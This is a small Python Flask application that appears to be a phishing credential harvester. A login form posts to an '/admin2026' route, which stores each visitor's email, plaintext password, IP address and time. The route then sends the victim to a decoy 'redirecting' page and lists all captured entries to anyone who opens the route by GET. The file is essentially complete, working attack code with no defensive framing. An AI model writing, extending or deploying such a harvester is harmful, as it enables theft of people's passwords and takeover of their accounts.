from flask import Flask, render_template, request, redirect, url_for
import datetime as datetime_

app = Flask(__name__)

subscribers = []


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/login")
def login():
    return render_template("login.html")


@app.route("/404_redirecting_page746857648894")
def redirecting():
    return render_template("redirecting.html")


@app.route("/admin2026", methods=["POST", "GET"])
def admin2026():
    email = request.form.get("email")
    password = request.form.get("password")
    ip_address = request.remote_addr
    datetime = datetime_.datetime.now()
    subscribers.append(f"Email: {email}, Password: {password}, IP Address: {ip_address}, Datetime: {datetime}")

    if request.method == "POST":
        return redirect(url_for("redirecting"))
        
    else:
        return render_template("admin2026.html", subscribers=subscribers)











if __name__ == "__main__":
    app.run(debug=True, port=5000)